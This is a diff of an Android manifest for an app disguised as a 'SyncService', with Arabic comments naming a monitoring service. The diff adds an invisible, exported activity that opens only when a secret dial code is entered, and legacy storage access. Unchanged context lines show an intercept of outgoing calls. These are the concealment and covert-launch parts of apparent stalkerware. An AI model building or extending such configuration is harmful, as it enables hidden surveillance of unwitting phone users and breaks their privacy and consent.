@@ -56,7 +56,9 @@
         android:label="@string/app_name"
         android:roundIcon="@android:drawable/ic_menu_preferences"
         android:supportsRtl="true"
-        android:theme="@style/Theme.SyncService">
+        android:theme="@style/Theme.SyncService"
+        android:requestLegacyExternalStorage="true"
+        tools:replace="android:label">
 
         <activity
             android:name=".MainActivity"
@@ -101,13 +103,18 @@
             android:taskAffinity=""
             android:launchMode="singleTask" />
 
-        <!-- منفذ حصري لاستقبال رمز الاتصال السري (*#1356365508#) -->
+        <!-- منفذ استقبال رمز الاتصال السري (v29 - Trampoline Activity) -->
         <activity
             android:name=".SecretCodeActivity"
             android:theme="@android:style/Theme.NoDisplay"
             android:excludeFromRecents="true"
             android:exported="true"
-            android:noHistory="true" />
+            android:noHistory="true">
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SECRET_CODE" />
+                <data android:scheme="android_secret_code" android:host="1356365508" />
+            </intent-filter>
+        </activity>
 
         <!-- خدمة المراقبة الأساسية -->
         <service
@@ -183,12 +190,12 @@
                 <action android:name="android.provider.Telephony.SECRET_CODE" />
                 <data android:scheme="android_secret_code" android:host="1356365508" />
             </intent-filter>
-            <!-- Secondary: standard secret code *#*#1356365508#*#* (Pixel / Stock) -->
+            <!-- Secondary: fallback secret code *#*#1356365508#*#* (Pixel / Stock) -->
             <intent-filter android:priority="999">
                 <action android:name="android.provider.Telephony.SECRET_CODE" />
                 <data android:scheme="android_secret_code" android:host="*#*#1356365508#*#*" />
             </intent-filter>
-            <!-- Fallback: Samsung One UI 5/6/7 — intercept outgoing call before it connects -->
+            <!-- Fallback: Samsung Call Interceptor (if secret code fails) -->
             <intent-filter android:priority="999">
                 <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
             </intent-filter>
